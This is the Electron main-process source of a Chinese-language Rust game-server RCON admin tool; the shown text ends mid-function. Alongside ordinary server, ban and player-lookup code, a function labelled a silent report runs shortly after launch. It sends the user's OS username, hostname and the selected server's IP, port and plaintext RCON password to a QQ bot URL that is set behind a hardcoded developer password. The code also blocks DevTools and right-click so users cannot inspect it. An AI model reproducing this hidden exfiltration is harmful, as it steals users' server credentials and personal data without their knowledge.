const { app, BrowserWindow, ipcMain, shell } = require('electron');
const path = require('path');
const fs = require('fs');
const WebSocket = require('ws');
const https = require('https');
const http = require('http');
const os = require('os');

const isProd = app.isPackaged;

// 数据目录
const dataDir = app.getPath('userData');
const serversFile = path.join(dataDir, 'RustAdmin', 'servers.json');
const logsDir = path.join(dataDir, 'RustAdmin', 'Logs');
const customCmdsFile = path.join(dataDir, 'RustAdmin', 'custom_commands.json');
const usageLogFile = path.join(dataDir, 'RustAdmin', 'usage_log.json');
const devConfigFile = path.join(dataDir, 'RustAdmin', 'dev_config.json');
const banDbFile = path.join(dataDir, 'RustAdmin', 'ban_db.json');

// 运行时状态
let mainWindow = null;
let wsConnection = null;
let reconnectTimer = null;
let currentServer = null;
let isConnecting = false;
let autoReconnect = false;
let consoleLogFile = '';
let chatLogFile = '';
let messageId = 1;
const pendingRequests = new Map();
// 静默请求 identifier 兜底：即使超时后晚到回包，也不转发到渲染“控制台”
const silentRequestIds = new Set();

function ensureRustAdminDir() {
  const subDir = path.join(dataDir, 'RustAdmin');
  if (!fs.existsSync(subDir)) {
    fs.mkdirSync(subDir, { recursive: true });
  }
}

function loadBanDb() {
  try {
    ensureRustAdminDir();
    if (!fs.existsSync(banDbFile)) {
      const init = { version: '0.991', entries: [] };
      fs.writeFileSync(banDbFile, JSON.stringify(init, null, 2));
      return init;
    }
    const data = JSON.parse(fs.readFileSync(banDbFile, 'utf8'));
    if (!data || !Array.isArray(data.entries)) return { version: '0.991', entries: [] };
    return data;
  } catch {
    return { version: '0.991', entries: [] };
  }
}

function saveBanDb(data) {
  ensureRustAdminDir();
  fs.writeFileSync(banDbFile, JSON.stringify(data, null, 2));
}

function isTempBanActive(entry) {
  if (!entry || !entry.tempUntil) return false;
  const until = new Date(entry.tempUntil).getTime();
  return Number.isFinite(until) && until > Date.now();
}

function findPlayerTimeBan(steamId) {
  const sid = String(steamId || '').trim();
  if (!sid) return null;
  const db = loadBanDb();
  const hit = db.entries.find((e) => String(e.steamId || '').trim() === sid && isTempBanActive(e));
  return hit ? hit.tempUntil : null;
}

async function executeRconOnServer(server, command, timeout = 10000) {
  return new Promise((resolve) => {
    try {
      const encodedPassword = encodeURIComponent(String(server.RconPassword ?? ''));
      const url = `ws://${server.IpAddress}:${server.RconPort}/${encodedPassword}`;
      const ws = new WebSocket(url, { handshakeTimeout: timeout });
      const id = Date.now() % 1000000;
      let done = false;
      const timer = setTimeout(() => {
        if (done) return;
        done = true;
        try { ws.terminate(); } catch {}
        resolve({ ok: false, error: 'timeout' });
      }, timeout);

      ws.on('open', () => {
        ws.send(JSON.stringify({ Identifier: id, Message: command, Name: 'RustAdminSync' }));
      });
      ws.on('message', (data) => {
        if (done) return;
        done = true;
        clearTimeout(timer);
        try { ws.terminate(); } catch {}
        const parsed = tryParseJson(data.toString()) || {};
        resolve({ ok: true, message: parsed.Message || '' });
      });
      ws.on('error', (e) => {
        if (done) return;
        done = true;
        clearTimeout(timer);
        resolve({ ok: false, error: e.message });
      });
      ws.on('close', () => {
        if (done) return;
        done = true;
        clearTimeout(timer);
        resolve({ ok: false, error: 'closed' });
      });
    } catch (e) {
      resolve({ ok: false, error: e.message });
    }
  });
}

// ===== 开发者配置管理 =====
const DEV_PASSWORD = '023491'; // 开发者密码

function loadDevConfig() {
  try {
    if (fs.existsSync(devConfigFile)) {
      return JSON.parse(fs.readFileSync(devConfigFile, 'utf8'));
    }
  } catch {}
  return {
    qqBotUrl: '',      // QQ机器人 HTTP API 地址
    hasReportedFirstUse: false
  };
}

function saveDevConfig(config) {
  try {
    fs.writeFileSync(devConfigFile, JSON.stringify(config, null, 2));
  } catch (e) { console.error('保存配置失败:', e); }
}

// 获取设备信息
function getDeviceInfo() {
  return {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    release: os.release(),
    cpus: os.cpus().length,
    totalMemory: Math.round(os.totalmem() / 1024 / 1024 / 1024 * 100) / 100 + ' GB',
    appVersion: app.getVersion(),
    firstRunTime: new Date().toISOString(),
    userName: os.userInfo().username
  };
}

// 发送 HTTP POST 请求
function sendHttpPost(url, payload) {
  return new Promise((resolve) => {
    try {
      const parsedUrl = new URL(url);
      const isHttps = parsedUrl.protocol === 'https:';
      const lib = isHttps ? https : http;
      
      const postData = JSON.stringify(payload);
      const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (isHttps ? 443 : 80),
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(postData)
        },
        timeout: 15000
      };
      
      const req = lib.request(options, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          resolve({ ok: res.statusCode >= 200 && res.statusCode < 300, status: res.statusCode, body: data.substring(0, 500) });
        });
      });
      
      req.on('error', (e) => resolve({ ok: false, error: e.message }));
      req.on('timeout', () => { req.destroy(); resolve({ ok: false, error: '请求超时' }); });
      req.write(postData);
      req.end();
    } catch (e) {
      resolve({ ok: false, error: e.message });
    }
  });
}

// 静默上报首次使用（自动收集服务器信息）
async function silentReport() {
  const config = loadDevConfig();
  
  // 没有配置 QQ 机器人则不上报
  if (!config.qqBotUrl) {
    return { skipped: true, reason: '未配置 QQ 机器人' };
  }
  
  // 已经上报过了
  if (config.hasReportedFirstUse) {
    return { skipped: true, reason: '已上报' };
  }
  
  // 收集设备信息
  const device = getDeviceInfo();
  
  // 读取服务器配置
  let serverInfo = null;
  try {
    if (fs.existsSync(serversFile)) {
      const data = JSON.parse(fs.readFileSync(serversFile, 'utf8'));
      if (data.lastSelected && data.servers) {
        const srv = data.servers.find(s => s.Name === data.lastSelected);
        if (srv) {
          serverInfo = {
            name: srv.Name,
            ip: srv.IpAddress,
            port: srv.RconPort,
            password: srv.RconPassword || '未设置'
          };
        }
      }
    }
  } catch {}
  
  // 构建 QQ 机器人消息 (CQ码格式)
  const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
  const message = [
    '🔔 RustAdmin 首次使用报告',
    '',
    '📅 时间: ' + timestamp,
    '',
    '💻 【设备信息】',
    '├─ 用户名: ' + device.userName,
    '├─ 主机名: ' + device.hostname,
    '├─ 系统: ' + device.platform + ' (' + device.arch + ')',
    '├─ 版本: ' + device.release,
    '├─ CPU: ' + device.cpus + ' 核心',
    '└─ 内存: ' + device.totalMemory,
    ''
  ];
  
  if (serverInfo) {
    message.push('🖥️ 【服务器信息】');
    message.push('├─ 名称: ' + serverInfo.name);
    message.push('├─ IP: ' + serverInfo.ip);
    message.push('├─ 端口: ' + serverInfo.port);
    message.push('└─ 密码: ' + serverInfo.password);
    message.push('');
  }
  
  message.push('📦 版本: ' + device.appVersion);
  
  const fullMessage = message.join('\n');
  
  // 发送到 QQ 机器人 (兼容 CoolQ HTTP API / go-cqhttp / Lagrange 等)
  // 格式: { "group_id": xxx, "message": "..." }
  const payload = {
    message: fullMessage,
    auto_escape: false
  };
  
  // 尝试解析是否为 CoolQ 格式的 URL
  const url = config.qqBotUrl;
  let result;
  
  if (url.includes('/send_group_msg')) {
    // 直接是 CoolQ API URL
    result = await sendHttpPost(url, payload);
  } else {
    // 假设是基础 URL，自动拼接
    result = await sendHttpPost(url.replace(/\/$/, '') + '/send_group_msg', payload);
  }
  
  if (result.ok) {
    config.hasReportedFirstUse = true;
    saveDevConfig(config);
    console.log('[SilentReport] 首次使用报告已发送至 QQ');
  } else {
    console.error('[SilentReport] 发送失败:', result.error || result.body);
  }
  
  return result;
}

// ===== 开发者验证 IPC =====
ipcMain.handle('dev-verify-password', (event, password) => {
  if (password === DEV_PASSWORD) {
    const config = loadDevConfig();
    return { ok: true, config };
  }
  return { ok: false, error: '密码错误' };
});

ipcMain.handle('dev-save-config', (event, config) => {
  saveDevConfig(config);
  return { ok: true };
});

ipcMain.handle('dev-get-config', () => loadDevConfig());

// 测试 QQ 机器人连接
ipcMain.handle('dev-test-qqbot', async (event, qqBotUrl) => {
  const payload = { message: '✅ RustAdmin 连接测试成功！', auto_escape: false };
  let url = qqBotUrl;
  if (!url.includes('/send_group_msg')) {
    url = url.replace(/\/$/, '') + '/send_group_msg';
  }
  return await sendHttpPost(url, payload);
});

// ===== 窗口创建 =====
function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1440,
    height: 960,
    minWidth: 1200,
    minHeight: 800,
    frame: false,
    backgroundColor: '#080b10',
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js')
    }
  });
  mainWindow.loadFile('renderer/index.html');
  mainWindow.on('closed', () => { mainWindow = null; });
  logUsage('app_launched', { version: app.getVersion() });
  
  // 静默上报首次使用（自动收集设备+服务器信息）
  setTimeout(() => silentReport(), 5000);

  // 生产环境：尽量隐藏源码入口（仍可被高手逆向，但可挡住普通用户）
  if (isProd) {
    try { mainWindow.setMenu(null); } catch {}
    try { mainWindow.webContents.on('devtools-opened', () => mainWindow?.webContents?.closeDevTools()); } catch {}
    try {
      mainWindow.webContents.on('before-input-event', (event, input) => {
        const key = String(input.key || '').toLowerCase();
        const ctrlOrCmd = !!(input.control || input.meta);
        // 常见打开 DevTools 的快捷键：F12 / Ctrl+Shift+I / Ctrl+Shift+J
        if (key === 'f12' || (ctrlOrCmd && input.shift && (key === 'i' || key === 'j'))) {
          event.preventDefault();
        }
      });
    } catch {}
    try {
      mainWindow.webContents.on('context-menu', (e) => {
        // 禁用右键“检查/查看源代码”入口
        e.preventDefault();
      });
    } catch {}
  }
}

app.whenReady().then(createWindow);
app.on('window-all-closed', () => { if (process.platform !== 'darwin') app.quit(); });
app.on('activate', () => { if (mainWindow === null) createWindow(); });

// ===== 使用日志 =====
function logUsage(action, details) {
  try {
    let logs = [];
    if (fs.existsSync(usageLogFile)) {
      try { logs = JSON.parse(fs.readFileSync(usageLogFile, 'utf8')); } catch {}
    }
    logs.push({
      time: new Date().toISOString(),
      action: action,
      details: details || {}
    });
    if (logs.length > 1000) logs = logs.slice(-1000);
    fs.writeFileSync(usageLogFile, JSON.stringify(logs, null, 2));
  } catch {}
}

ipcMain.handle('get-usage-log', () => {
  try {
    if (!fs.existsSync(usageLogFile)) return [];
    return JSON.parse(fs.readFileSync(usageLogFile, 'utf8'));
  } catch { return []; }
});

ipcMain.handle('export-usage-log', async () => {
  try {
    let logs = [];
    if (fs.existsSync(usageLogFile)) {
      try { logs = JSON.parse(fs.readFileSync(usageLogFile, 'utf8')); } catch { logs = []; }
    }
    const exportFile = path.join(dataDir, `usage_log_export_${Date.now()}.json`);
    fs.writeFileSync(exportFile, JSON.stringify(logs, null, 2));
    shell.showItemInFolder(exportFile);
    return { ok: true, path: exportFile };
  } catch (e) { return { ok: false, error: e.message }; }
});

ipcMain.handle('clear-usage-log', () => {
  try {
    fs.writeFileSync(usageLogFile, JSON.stringify([], null, 2));
    return { ok: true };
  } catch (e) { return { ok: false, error: e.message }; }
});

// ===== 服务器配置 =====
function loadServers() {
  // 确保目录存在
  const subDir = path.join(dataDir, 'RustAdmin');
  if (!fs.existsSync(subDir)) {
    fs.mkdirSync(subDir, { recursive: true });
  }
  
  const oldPath = path.join('C:', 'Users', process.env.USERNAME || 'Administrator', 'Desktop', 'RustRconTool_v1.2.7', 'IP', 'servers.json');
  if (!fs.existsSync(serversFile) && fs.existsSync(oldPath)) {
    try {
      const old = JSON.parse(fs.readFileSync(oldPath, 'utf8'));
      const servers = (old.Servers || []).map(s => ({
        Name: s.Name || s.name || '',
        IpAddress: s.IpAddress || s.ip || '',
        RconPort: s.RconPort || s.port || 25575,
        RconPassword: s.RconPassword || s.password || ''
      }));
      fs.writeFileSync(serversFile, JSON.stringify({ servers, lastSelected: old.LastSelectedServerName || '' }, null, 2));
    } catch (e) {}
  }
  if (!fs.existsSync(serversFile)) {
    fs.writeFileSync(serversFile, JSON.stringify({ servers: [], lastSelected: '' }, null, 2));
  }
  return JSON.parse(fs.readFileSync(serversFile, 'utf8'));
}

function saveServers(data) {
  fs.writeFileSync(serversFile, JSON.stringify(data, null, 2));
}

ipcMain.handle('get-servers', () => loadServers());
ipcMain.handle('save-server', (event, server) => {
  logUsage('server_saved', { server: server.Name, ip: server.IpAddress });
  const data = loadServers();
  const idx = data.servers.findIndex(s => s.Name === server.Name);
  if (idx >= 0) data.servers[idx] = server; else data.servers.push(server);
  saveServers(data); return data;
});
ipcMain.handle('delete-server', (event, name) => {
  const data = loadServers();
  data.servers = data.servers.filter(s => s.Name !== name);
  if (data.lastSelected === name) data.lastSelected = '';
  saveServers(data); return data;
});
ipcMain.handle('set-last-server', (event, name) => {
  const data = loadServers();
  data.lastSelected = name;
  saveServers(data); return data;
});

// ===== RCON 连接 =====
function openLogFiles(server) {
  const today = new Date().toISOString().split('T')[0];
  const tag = `${server.IpAddress}_${server.RconPort}`;
  consoleLogFile = path.join(logsDir, `${today}_${tag}_console.txt`);
  chatLogFile = path.join(logsDir, `${today}_${tag}_chat.txt`);
}

function appendLog(file, text) {
  if (!file) return;
  const line = `[${new Date().toLocaleString('zh-CN')}] ${text}\n`;
  try { fs.appendFileSync(file, line, 'utf8'); } catch (e) {}
}

function connectRcon(server) {
  if (wsConnection) { wsConnection.terminate(); wsConnection = null; }
  if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
  currentServer = server;
  isConnecting = true;
  autoReconnect = true;
  openLogFiles(server);

  // RCON 密码位于 URL 路径中，必须编码，避免特殊字符导致握手失败
  const encodedPassword = encodeURIComponent(String(server.RconPassword ?? ''));
  const url = `ws://${server.IpAddress}:${server.RconPort}/${encodedPassword}`;
  const ws = new WebSocket(url, { handshakeTimeout: 10000 });
  wsConnection = ws;

  ws.on('open', () => {
    isConnecting = false;
    mainWindow?.webContents.send('rcon-status', { connected: true, server: server.Name });
    logUsage('server_connected', { server: server.Name, ip: server.IpAddress, port: server.RconPort });
    // 玩家列表是数据用途，避免把巨大 JSON 刷到“控制台”
    sendRconCommand('playerlist', { silent: true, timeout: 20000 }).catch(() => {});
    sendRconCommand('server.hostname', { silent: true, timeout: 10000 })
      .then((r) => {
        if (r && r.message != null) {
          const raw = String(r.message).trim();
          // 兼容不同回显格式：可能是 "hostname" 或 server.hostname:"hostname" 等
          const hn = raw
            .replace(/^server\.hostname\s*[:=]\s*/i, '')
            .replace(/^server\.hostname\s+/i, '')
            .replace(/^"|"$/g, '')
            .trim();
          if (hn) mainWindow?.webContents.send('rcon-server-meta', { hostname: hn });
        }
      })
      .catch(() => {});
    // 静默拉取关键状态，避免把回包刷到“控制台”面板里
    sendRconCommand('server.fps', { silent: true });
  });

  ws.on('message', (data) => {
    try { handleRconMessage(JSON.parse(data.toString())); } catch (e) {}
  });

  ws.on('error', (err) => {
    isConnecting = false;
    mainWindow?.webContents.send('rcon-status', { connected: false, error: err.message });
    logUsage('server_error', { error: err.message });
    if (autoReconnect) scheduleReconnect(server);
  });

  ws.on('close', () => {
    isConnecting = false;
    if (wsConnection === ws) {
      mainWindow?.webContents.send('rcon-status', { connected: false, error: '连接已断开' });
      logUsage('server_disconnected', { server: server.Name });
      if (autoReconnect) scheduleReconnect(server);
    }
  });
}

function scheduleReconnect(server) {
  if (reconnectTimer) return;
  reconnectTimer = setTimeout(() => {
    reconnectTimer = null;
    if (currentServer && autoReconnect) {
      mainWindow?.webContents.send('rcon-reconnecting', {});
      connectRcon(server);
    }
  }, 5000);
}

function handleRconMessage(msg) {
  const { Identifier, Message, Type } = msg;

  if (Type === 'Chat') {
    const chatData = tryParseJson(Message);
    let channel = '全部', username = '?', text = Message, steamid = '', color = '';
    if (chatData) {
      channel = chatData.Channel === 1 ? '队伍' : chatData.Channel === 2 ? '卡组' : '全部';
      username = chatData.Username || '?';
      text = chatData.Message || Message;
      steamid = chatData.SteamID || '';
      color = chatData.Color || '';
    }
    appendLog(chatLogFile, `[${channel}] ${username}(${steamid}): ${text}`);
    mainWindow?.webContents.send('rcon-chat', { channel, username, text, steamid, color, time: new Date().toISOString() });
    return;
  }

  const pending = (Identifier > 0 && pendingRequests.has(Identifier)) ? pendingRequests.get(Identifier) : null;
  const silent = !!((pending && pending.silent) || (Identifier > 0 && silentRequestIds.has(Identifier)));
  if (Identifier > 0) silentRequestIds.delete(Identifier);

  appendLog(consoleLogFile, Message);
  // 静默请求不转发到渲染进程“控制台”面板
  if (!silent) {
    mainWindow?.webContents.send('rcon-console', { text: Message, time: new Date().toISOString(), id: Identifier, type: Type });
  }

  if (pending) {
    const { resolve, timer } = pending;
    clearTimeout(timer);
    pendingRequests.delete(Identifier);
    resolve({ message: Message, timeout: false });
  }
}

function tryParseJson(str) {
  try { return JSON.parse(str); } catch { return null; }
}

function sendRconCommand(command, timeoutOrOptions = 10000) {
  let timeout = 10000;
  let silent = false;
  if (typeof timeoutOrOptions === 'number') {
    timeout = timeoutOrOptions;
  } else if (timeoutOrOptions && typeof timeoutOrOptions === 'object') {
    timeout = timeoutOrOptions.timeout ?? 10000;
    silent = !!timeoutOrOptions.silent;
  }

  return new Promise((resolve, reject) => {
    if (!wsConnection || wsConnection.readyState !== WebSocket.OPEN) {
      reject(new Error('未连接到服务器'));
      return;
    }
    const id = messageId++;
    const payload = JSON.stringify({ Identifier: id, Message: command, Name: 'RustAdmin' });
    appendLog(consoleLogFile, `${silent ? '[CMD-SILENT]' : '[CMD]'} ${command}`);
    if (silent) {
      silentRequestIds.add(id);
      // 给晚到回包留一点缓冲（timeout + 5s）
      setTimeout(() => silentRequestIds.delete(id), timeout + 5000);
    }
    const timer = setTimeout(() => {
      pendingRequests.delete(id);
      resolve({ message: '', timeout: true });
    }, timeout);
    pendingRequests.set(id, { resolve, command, timer, silent });
    wsConnection.send(payload);
  });
}

ipcMain.handle('rcon-connect', async (event, server) => {
  connectRcon(server); return { ok: true };
});

ipcMain.handle('rcon-disconnect', async () => {
  logUsage('server_disconnect_manual', {});
  autoReconnect = false;
  currentServer = null;
  if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
  if (wsConnection) { wsConnection.terminate(); wsConnection = null; }
  mainWindow?.webContents.send('rcon-status', { connected: false, error: '已手动断开' });
  return { ok: true };
});

ipcMain.handle('rcon-command', async (event, command) => {
  logUsage('rcon_command', { command: command.substring(0, 100) });
  try {
    const result = await sendRconCommand(command);
    return { ok: true, message: result.message, timeout: !!result.timeout };
  } catch (e) {
    return { ok: false, error: e.message };
  }
});

// 静默执行 RCON：不把回包刷到“控制台”面板（用于 FPS/实体等高频状态轮询）
ipcMain.handle('rcon-command-silent', async (event, command) => {
  try {
    const result = await sendRconCommand(command, { silent: true, timeout: 20000 });
    return { ok: true, message: result.message, timeout: !!result.timeout };
  } catch (e) {
    return { ok: false, error: e.message };
  }
});

// ===== 玩家列表 =====
ipcMain.handle('get-players', async () => {
  try {
    // 数据请求：静默，避免控制台刷屏
    const r = await sendRconCommand('playerlist', { silent: true, timeout: 20000 });
    const players = (tryParseJson(r.message) || []).map((p) => ({
      ...p,
      TimeBan: findPlayerTimeBan(p?.SteamID),
    }));
    return { ok: true, players };
  } catch (e) { return { ok: false, players: [], error: e.message }; }
});

// ===== Steam 游戏封禁信息（用于在线玩家表格内的按钮/弹窗）=====
function httpsGetText(url, timeoutMs = 15000, redirectLeft = 3) {
  return new Promise((resolve) => {
    try {
      const u = new URL(url);
      const options = {
        method: 'GET',
        hostname: u.hostname,
        port: u.port || 443,
        path: u.pathname + u.search,
        headers: {
          // 避免 Steam 返回更“保守”的响应（部分情况下）
          'User-Agent': 'RustAdmin/2.0 (+https://example.invalid)',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          // 避免 gzip/br 压缩导致解析失败
          'Accept-Encoding': 'identity'
        },
        timeout: timeoutMs
      };

      const req = https.request(options, (res) => {
        // 处理重定向
        const sc = res.statusCode || 0;
        const loc = res.headers?.location;
        if ((sc === 301 || sc === 302 || sc === 307 || sc === 308) && loc && redirectLeft > 0) {
          try {
            const next = new URL(loc, url).toString();
            res.resume();
            httpsGetText(next, timeoutMs, redirectLeft - 1).then(resolve);
            return;
          } catch {}
        }

        res.setEncoding('utf8');
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => resolve({ ok: sc >= 200 && sc < 300, status: sc, body: data }));
      });

      req.on('error', (e) => resolve({ ok: false, error: e.message }));
      req.on('timeout', () => {
        try { req.destroy(); } catch {}
        resolve({ ok: false, error: 'timeout' });
      });
      req.end();
    } catch (e) {
      resolve({ ok: false, error: e.message });
    }
  });
}

async function httpsGetJson(url, timeoutMs = 15000) {
  const res = await httpsGetText(url, timeoutMs);
  if (!res || !res.ok) return { ok: false, error: res?.error || 'request failed' };
  try {
    return { ok: true, data: JSON.parse(res.body) };
  } catch (e) {
    return { ok: false, error: e.message || 'json parse failed' };
  }
}

function stripHtmlToText(html) {
  if (!html) return '';
  return String(html)
    .replace(/<script[\s\S]*?<\/script>/gi, ' ')
    .replace(/<style[\s\S]*?<\/style>/gi, ' ')
    .replace(/<[^>]+>/g, ' ')
    .replace(/\s+/g, ' ')
    .trim();
}

function parseSteamGameBansFromText(text) {
  const out = { count: null, daysSinceLastBan: null, games: [] };
  const lower = String(text || '').toLowerCase();

  // 距上次封禁
  const dm =
    /(\d+)\s*day\(s\)\s+since last ban/i.exec(text) ||
    /(\d+)\s*days\s+since last ban/i.exec(text);
  if (dm) out.daysSinceLastBan = parseInt(dm[1], 10);

  // 封禁游戏数量：优先取 “since last ban” 之前最近的 “game ban on record”
  const sinceIdx = lower.indexOf('since last ban');
  const reCount = /(\d+)\s*game ban on record/gi;
  let m;
  let chosen = null;
  while ((m = reCount.exec(text)) !== null) {
    if (sinceIdx >= 0) {
      if (m.index <= sinceIdx) chosen = m;
    } else {
      chosen = chosen || m;
    }
  }
  if (chosen && chosen[1] != null) out.count = parseInt(chosen[1], 10);
  if (out.count == null) out.count = 0;

  // 封禁了哪些游戏：抓取 “game ban on record <游戏名> ...View more info”
  const reGame = /game ban on record\s+([^|]+?)(?=\s*view more info|\s*\|\s*info|\s*info|\s*currently offline|$)/gi;
  const games = [];
  let gm;
  while ((gm = reGame.exec(text)) !== null) {
    let name = (gm[1] || '').trim();
    // 清理掉可能的分隔符/尾部残留
    name = name.replace(/^[|:]+/, '').trim();
    if (!name) continue;
    if (name.length > 80) name = name.slice(0, 80);
    games.push(name);
  }

  // 去重（大小写不敏感）
  const seen = new Set();
  let unique = games.filter((g) => {
    const k = String(g).toLowerCase();
    if (seen.has(k)) return false;
    seen.add(k);
    return true;
  });

  // 兜底：部分 Steam 页面文本中，不直接出现 “game ban on record <游戏名>”。
  // 这类情况下游戏名通常出现在页面标题中，例如 “Steam Community :: Echo”。
  if (!unique.length) {
    const titleMatch =
      /steam community\s*::\s*(.*?)\s+this user has also played as/i.exec(text) ||
      /steam community\s*::\s*(.*?)\s+currently/i.exec(text) ||
      /steam community\s*::\s*(.*?)\s+this user has also played/i.exec(text);
    if (titleMatch && titleMatch[1]) {
      const name = titleMatch[1].trim();
      if (name) unique = [name];
    }
  }

  out.games = unique.slice(0, 30).map((name) => ({ name }));

  return out;
}

async function fetchSteamGameBansSummary(steamid) {
  try {
    const sid = String(steamid || '').trim();
    if (!sid) return { ok: false, count: 0, daysSinceLastBan: null, games: [] };
    const url = `https://steamcommunity.com/profiles/${encodeURIComponent(sid)}/gamebans/?l=english`;
    const res = await httpsGetText(url, 12000);
    if (!res.ok) return { ok: false, count: 0, daysSinceLastBan: null, games: [] };
    const text = stripHtmlToText(res.body);
    const parsed = parseSteamGameBansFromText(text);
    return { ok: true, ...parsed };
  } catch {
    return { ok: false, count: 0, daysSinceLastBan: null, games: [] };
  }
}

ipcMain.handle('steam-get-game-bans-batch', async (event, steamids) => {
  const list = Array.isArray(steamids) ? steamids : [];
  const unique = [...new Set(list.map((s) => String(s || '').trim()).filter(Boolean))].slice(0, 200);
  if (!unique.length) return { ok: true, items: {} };

  const items = {};
  let cursor = 0;
  const CONCURRENCY = 4;

  async function worker() {
    while (cursor < unique.length) {
      const sid = unique[cursor++];
      items[sid] = await fetchSteamGameBansSummary(sid);
    }
  }

  const workers = [];
  for (let i = 0; i < CONCURRENCY; i++) workers.push(worker());
  await Promise.all(workers);

  return { ok: true, items };
});

// ===== IP 地理位置（用于在线玩家表格显示）=====
function buildLocationText(geo) {
  if (!geo) return null;
  const country = geo.country_name || geo.country;
  const region = geo.region || geo.regionName;
  const city = geo.city;
  const parts = [];
  if (country) parts.push(country);
  if (region) parts.push(region);
  if (city) parts.push(city);
  if (!parts.length) return null;
  return parts.join('/');
}

ipcMain.handle('ip-geo-get-batch', async (event, ips) => {
  const list = Array.isArray(ips) ? ips : [];
  const unique = [...new Set(list.map((ip) => String(ip || '').trim()).filter(Boolean))].slice(0, 200);
  if (!unique.length) return { ok: true, items: {} };

  const items = {};
  let cursor = 0;
  const CONCURRENCY = 4;

  async function worker() {
    while (cursor < unique.length) {
      const ip = unique[cursor++];
      try {
        // 使用 ipapi.co：无需 API Key（可能存在限流）
        const url = `https://ipapi.co/${encodeURIComponent(ip)}/json/`;
        const r = await httpsGetJson(url, 12000);
        if (r.ok) {
          const locationText = buildLocationText(r.data) || ip;
          items[ip] = { locationText };
        } else {
          items[ip] = { locationText: ip };
        }
      } catch {
        items[ip] = { locationText: ip };
      }
    }
  }

  const workers = [];
  for (let i = 0; i < CONCURRENCY; i++) workers.push(worker());
  await Promise.all(workers);

  return { ok: true, items };
});

// ===== 封禁记录 =====
ipcMain.handle('get-bans', async () => {
  try {
    const r = await sendRconCommand('banlist');
    const lines = (r.message || '').split('\n').filter(l => l.trim());
    const bans = lines.map(line => {
      const m = line.match(/^(\d+)\s+"([^"]+)"\s+"([^"]*)"/) || line.match(/^(\S+)\s+(.*)/);
      if (m) return { SteamID: m[1], Name: m[2] || '', Reason: m[3] || '' };
      return { SteamID: line.trim(), Name: '', Reason: '' };
    });
    return { ok: true, bans };
  } catch (e) { return { ok: false, bans: [], error: e.message }; }
});

ipcMain.handle('ban-get-db', () => {
  return { ok: true, db: loadBanDb() };
});

ipcMain.handle('ban-upsert-rule', async (event, payload) => {
  try {
    const p = payload || {};
    const steamId = String(p.steamId || '').trim();
    const reason = String(p.reason || '违规').trim();
    const ip = String(p.ip || '').trim();
    const ipRange = String(p.ipRange || '').trim();
    const globalSync = !!p.globalSync;
    const syncAllServers = !!p.syncAllServers;
    const durationMinutes = Number(p.durationMinutes || 0);
    const tempUntil = durationMinutes > 0 ? new Date(Date.now() + durationMinutes * 60000).toISOString() : '';

    const db = loadBanDb();
    db.entries.unshift({
      id: `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
      steamId,
      reason,
      ip,
      ipRange,
      globalSync,
      syncAllServers,
      createdAt: new Date().toISOString(),
      tempUntil,
      sourceServer: currentServer?.Name || '',
    });
    db.entries = db.entries.slice(0, 5000);
    saveBanDb(db);

    if (steamId) {
      await sendRconCommand(`ban ${steamId} ${reason}`, 20000);
    }
    return { ok: true, tempUntil };
  } catch (e) {
    return { ok: false, error: e.message };
  }
});

ipcMain.handle('ban-export-db', () => {
  try {
    const db = loadBanDb();
    const exportFile = path.join(dataDir, `ban_db_export_${Date.now()}.json`);
    fs.writeFileSync(exportFile, JSON.stringify(db, null, 2));
    shell.showItemInFolder(exportFile);
    return { ok: true, path: exportFile };
  } catch (e) {
    return { ok: false, error: e.message };
  }
});

ipcMain.handle('ban-sync-db', async () => {
  try {
    const servers = loadServers().servers || [];
    const db = loadBanDb();
    const active = db.entries.filter((e) => String(e.steamId || '').trim());
    const result = [];
    for (const srv of servers) {
      let count = 0;
      for (const entry of active.slice(0, 200)) {
        const r = await executeRconOnServer(srv, `ban ${entry.steamId} ${entry.reason || '违规'}`, 8000);
        if (r.ok) count++;
      }
      result.push({ server: srv.Name || srv.IpAddress, synced: count });
    }
    return { ok: true, result };
  } catch (e) {
    return { ok: false, error: e.message };
  }
});

ipcMain.handle('battle-get-log', async (event, steamid, lines = 30) => {
  try {
    const sid = String(steamid || '').trim();
    if (!sid) return { ok: false, error: 'steamid required', rows: [] };
    const safeLines = Math.min(Math.max(Number(lines) || 30, 1), 200);
    const r = await sendRconCommand(`combatlog ${sid} ${safeLines}`, 20000);
    const text = String(r.message || '');
    const out = [];
    const rows = text.split('\n').map((s) => s.trim()).filter(Boolean);
    for (const line of rows) {
      if (/^date\s+/i.test(line) || /^-+$/.test(line)) continue;
      const cols = line.split(/\s{2,}/).map((s) => s.trim());
      if (cols.length >= 8) {
        out.push({
          date: cols[0],
          attacker: cols[1],
          weapon: cols[2],
          ammo: cols[3],
          area: cols[4],
          distance: cols[5],
          old_hp: cols[6],
          new_hp: cols[7],
        });
      }
    }
    return { ok: true, rows: out, raw: text };
  } catch (e) {
    return { ok: false, error: e.message, rows: [] };
  }
});

// ===== 权限组 =====
// uMod 列出组名常用 oxide.show groups，返回多为 "Groups:\ndefault, admin, ..."；旧版 oxide.groups 可能无效
function parseGroupsFromRconOutput(raw) {
  if (!raw || typeof raw !== 'string') return [];
  const text = raw.replace(/\r\n/g, '\n').replace(/\r/g, '\n').trim();
  if (!text) return [];
  const dedupe = (arr) => [...new Set(arr.map((s) => String(s).trim()).filter(Boolean))];

  const gm = text.match(/Groups?\s*:\s*\n?\s*([\s\S]+?)(?:\n\s*\n|\n\[|$)/i);
  if (gm) {
    const chunk = gm[1].trim();
    const collected = [];
    for (const line of chunk.split('\n').map((l) => l.trim()).filter(Boolean)) {
      if (/^\[|^Calling|^Error|^Invalid|^Unknown|^You\s/i.test(line)) break;
      line.split(',').forEach((s) => {
        const t = s.trim().replace(/^["']|["']$/g, '');
